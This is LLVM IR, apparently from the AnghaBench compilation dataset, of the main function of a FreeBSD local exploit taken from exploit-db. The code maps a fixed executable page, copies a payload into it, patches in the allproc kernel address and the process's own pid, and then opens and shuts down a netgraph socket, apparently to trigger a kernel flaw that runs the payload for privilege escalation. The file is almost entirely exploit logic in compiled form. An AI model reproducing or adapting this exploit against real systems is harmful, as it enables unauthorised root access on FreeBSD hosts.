; ModuleID = '/home/carl/AnghaBench/exploitdb/exploits/freebsd/local/extr_7581.c_main.c'
source_filename = "/home/carl/AnghaBench/exploitdb/exploits/freebsd/local/extr_7581.c_main.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

@stderr = common dso_local global i32 0, align 4
@.str = private unnamed_addr constant [22 x i8] c"usage: ./x <allproc>\0A\00", align 1
@PAGES = common dso_local global i32 0, align 4
@PAGE_SIZE = common dso_local global i32 0, align 4
@PROT_READ = common dso_local global i32 0, align 4
@PROT_WRITE = common dso_local global i32 0, align 4
@PROT_EXEC = common dso_local global i32 0, align 4
@MAP_ANON = common dso_local global i32 0, align 4
@MAP_FIXED = common dso_local global i32 0, align 4
@MAP_FAILED = common dso_local global i8* null, align 8
@.str.1 = private unnamed_addr constant [5 x i8] c"mmap\00", align 1
@x = common dso_local global i64 0, align 8
@PATTERN1 = common dso_local global i64 0, align 8
@PATTERN2 = common dso_local global i64 0, align 8
@PF_NETGRAPH = common dso_local global i32 0, align 4
@SOCK_DGRAM = common dso_local global i32 0, align 4
@NG_DATA = common dso_local global i32 0, align 4
@.str.2 = private unnamed_addr constant [7 x i8] c"socket\00", align 1
@SHUT_RDWR = common dso_local global i32 0, align 4

; Function Attrs: noinline nounwind optnone uwtable
define dso_local i32 @main(i32 %0, i8** %1) #0 {
  %3 = alloca i32, align 4
  %4 = alloca i32, align 4
  %5 = alloca i8**, align 8
  %6 = alloca i32, align 4
  %7 = alloca i32*, align 8
  %8 = alloca i32*, align 8
  %9 = alloca i32*, align 8
  %10 = alloca i8*, align 8
  %11 = alloca i32, align 4
  %12 = alloca i32, align 4
  store i32 0, i32* %3, align 4
  store i32 %0, i32* %4, align 4
  store i8** %1, i8*** %5, align 8
  %13 = load i32, i32* %4, align 4
  %14 = icmp ne i32 %13, 2
  br i1 %14, label %15, label %18

15:                                               ; preds = %2
  %16 = load i32, i32* @stderr, align 4
  %17 = call i32 @fprintf(i32 %16, i8* getelementptr inbounds ([22 x i8], [22 x i8]* @.str, i64 0, i64 0))
  store i32 1, i32* %3, align 4
  br label %130

18:                                               ; preds = %2
  %19 = load i8**, i8*** %5, align 8
  %20 = getelementptr inbounds i8*, i8** %19, i64 1
  %21 = load i8*, i8** %20, align 8
  %22 = call i32 @strtoul(i8* %21, i32 0, i32 0)
  store i32 %22, i32* %6, align 4
  %23 = load i32, i32* @PAGES, align 4
  %24 = load i32, i32* @PAGE_SIZE, align 4
  %25 = mul nsw i32 %23, %24
  %26 = load i32, i32* @PROT_READ, align 4
  %27 = load i32, i32* @PROT_WRITE, align 4
  %28 = or i32 %26, %27
  %29 = load i32, i32* @PROT_EXEC, align 4
  %30 = or i32 %28, %29
  %31 = load i32, i32* @MAP_ANON, align 4
  %32 = load i32, i32* @MAP_FIXED, align 4
  %33 = or i32 %31, %32
  %34 = call i8* @mmap(i32* null, i32 %25, i32 %30, i32 %33, i32 -1, i32 0)
  store i8* %34, i8** %10, align 8
  %35 = load i8*, i8** %10, align 8
  %36 = load i8*, i8** @MAP_FAILED, align 8
  %37 = icmp eq i8* %35, %36
  br i1 %37, label %38, label %40

38:                                               ; preds = %18
  %39 = call i32 @perror(i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.1, i64 0, i64 0))
  store i32 0, i32* %3, align 4
  br label %130

40:                                               ; preds = %18
  %41 = load i8*, i8** %10, align 8
  %42 = bitcast i8* %41 to i32*
  store i32* %42, i32** %7, align 8
  %43 = load i64, i64* @x, align 8
  %44 = inttoptr i64 %43 to i32*
  store i32* %44, i32** %8, align 8
  br label %45

45:                                               ; preds = %40, %53
  %46 = load i32*, i32** %8, align 8
  %47 = load i32, i32* %46, align 4
  %48 = load i32*, i32** %7, align 8
  store i32 %47, i32* %48, align 4
  %49 = load i32*, i32** %8, align 8
  %50 = load i32, i32* %49, align 4
  %51 = icmp eq i32 %50, 195
  br i1 %51, label %52, label %53

52:                                               ; preds = %45
  br label %58

53:                                               ; preds = %45
  %54 = load i32*, i32** %8, align 8
  %55 = getelementptr inbounds i32, i32* %54, i32 1
  store i32* %55, i32** %8, align 8
  %56 = load i32*, i32** %7, align 8
  %57 = getelementptr inbounds i32, i32* %56, i32 1
  store i32* %57, i32** %7, align 8
  br label %45

58:                                               ; preds = %52
  %59 = load i32*, i32** %7, align 8
  %60 = getelementptr inbounds i32, i32* %59, i32 1
  store i32* %60, i32** %7, align 8
  store i32 195, i32* %59, align 4
  %61 = load i8*, i8** %10, align 8
  %62 = bitcast i8* %61 to i32*
  store i32* %62, i32** %7, align 8
  br label %63

63:                                               ; preds = %58, %86
  %64 = load i32*, i32** %7, align 8
  %65 = bitcast i32* %64 to i64*
  %66 = load i64, i64* %65, align 8
  %67 = load i64, i64* @PATTERN1, align 8
  %68 = icmp eq i64 %66, %67
  br i1 %68, label %69, label %86

69:                                               ; preds = %63
  %70 = load i32, i32* %6, align 4
  %71 = ashr i32 %70, 0
  %72 = load i32*, i32** %7, align 8
  %73 = getelementptr inbounds i32, i32* %72, i64 0
  store i32 %71, i32* %73, align 4
  %74 = load i32, i32* %6, align 4
  %75 = ashr i32 %74, 8
  %76 = load i32*, i32** %7, align 8
  %77 = getelementptr inbounds i32, i32* %76, i64 1
  store i32 %75, i32* %77, align 4
  %78 = load i32, i32* %6, align 4
  %79 = ashr i32 %78, 16
  %80 = load i32*, i32** %7, align 8
  %81 = getelementptr inbounds i32, i32* %80, i64 2
  store i32 %79, i32* %81, align 4
  %82 = load i32, i32* %6, align 4
  %83 = ashr i32 %82, 24
  %84 = load i32*, i32** %7, align 8
  %85 = getelementptr inbounds i32, i32* %84, i64 3
  store i32 %83, i32* %85, align 4
  br label %89

86:                                               ; preds = %63
  %87 = load i32*, i32** %7, align 8
  %88 = getelementptr inbounds i32, i32* %87, i32 1
  store i32* %88, i32** %7, align 8
  br label %63

89:                                               ; preds = %69
  %90 = call i32 (...) @getpid()
  store i32 %90, i32* %11, align 4
  br label %91

91:                                               ; preds = %89, %114
  %92 = load i32*, i32** %7, align 8
  %93 = bitcast i32* %92 to i64*
  %94 = load i64, i64* %93, align 8
  %95 = load i64, i64* @PATTERN2, align 8
  %96 = icmp eq i64 %94, %95
  br i1 %96, label %97, label %114

97:                                               ; preds = %91
  %98 = load i32, i32* %11, align 4
  %99 = ashr i32 %98, 0
  %100 = load i32*, i32** %7, align 8
  %101 = getelementptr inbounds i32, i32* %100, i64 0
  store i32 %99, i32* %101, align 4
  %102 = load i32, i32* %11, align 4
  %103 = ashr i32 %102, 8
  %104 = load i32*, i32** %7, align 8
  %105 = getelementptr inbounds i32, i32* %104, i64 1
  store i32 %103, i32* %105, align 4
  %106 = load i32, i32* %11, align 4
  %107 = ashr i32 %106, 16
  %108 = load i32*, i32** %7, align 8
  %109 = getelementptr inbounds i32, i32* %108, i64 2
  store i32 %107, i32* %109, align 4
  %110 = load i32, i32* %11, align 4
  %111 = ashr i32 %110, 24
  %112 = load i32*, i32** %7, align 8
  %113 = getelementptr inbounds i32, i32* %112, i64 3
  store i32 %111, i32* %113, align 4
  br label %117

114:                                              ; preds = %91
  %115 = load i32*, i32** %7, align 8
  %116 = getelementptr inbounds i32, i32* %115, i32 1
  store i32* %116, i32** %7, align 8
  br label %91

117:                                              ; preds = %97
  %118 = load i32, i32* @PF_NETGRAPH, align 4
  %119 = load i32, i32* @SOCK_DGRAM, align 4
  %120 = load i32, i32* @NG_DATA, align 4
  %121 = call i32 @socket(i32 %118, i32 %119, i32 %120)
  store i32 %121, i32* %12, align 4
  %122 = load i32, i32* %12, align 4
  %123 = icmp slt i32 %122, 0
  br i1 %123, label %124, label %126

124:                                              ; preds = %117
  %125 = call i32 @perror(i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.2, i64 0, i64 0))
  store i32 1, i32* %3, align 4
  br label %130

126:                                              ; preds = %117
  %127 = load i32, i32* %12, align 4
  %128 = load i32, i32* @SHUT_RDWR, align 4
  %129 = call i32 @shutdown(i32 %127, i32 %128)
  store i32 0, i32* %3, align 4
  br label %130

130:                                              ; preds = %126, %124, %38, %15
  %131 = load i32, i32* %3, align 4
  ret i32 %131
}

declare dso_local i32 @fprintf(i32, i8*) #1

declare dso_local i32 @strtoul(i8*, i32, i32) #1

declare dso_local i8* @mmap(i32*, i32, i32, i32, i32, i32) #1

declare dso_local i32 @perror(i8*) #1

declare dso_local i32 @getpid(...) #1

declare dso_local i32 @socket(i32, i32, i32) #1

declare dso_local i32 @shutdown(i32, i32) #1

attributes #0 = { noinline nounwind optnone uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "min-legal-vector-width"="0" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }

!llvm.module.flags = !{!0}
!llvm.ident = !{!1}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{!"clang version 10.0.1 (https://github.com/wsmoses/llvm-project-tok c8e5003577614e72d6d18a216e6a09771e1fcce4)"}
